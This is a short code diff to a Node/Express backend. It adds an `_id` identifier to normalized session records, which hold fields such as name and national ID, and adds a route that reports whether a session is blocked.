@@ -191,6 +191,9 @@ function canonicalStatus(value, fallback = "pending") {
 function canonicalSession(id, row, timestamp) {
   const source = row || {};
   const document = {};
+  // Customer pages use `_id` while the legacy dashboard contract also uses
+  // `id`/`uuid`; expose all three identifiers consistently on every response.
+  document._id = id;
   for (const field of SESSION_FIELDS) document[field] = source[field] ?? null;
   document.name = document.name ?? source.documentOwnerName ?? source.fullName ?? null;
   document.national_id = document.national_id ?? source.idNumber ?? source.identityNumber ?? null;
@@ -642,6 +645,10 @@ app.get("/breinit", (_req, res) => res.json({ ok: true }));
 app.post("/api/chat/enabled", (_req, res) =>
   res.json({ isChatEnabled: CHAT_ENABLED })
 );
+app.get("/order/status/:id", (req, res) => {
+  const session = db.get().users[req.params.id];
+  res.json({ data: { blocked: Boolean(session?.blocked) } });
+});
 
 // ---------- REST: customer site (frontend contract) ----------
 app.post("/api/user/init", (req, res) => {
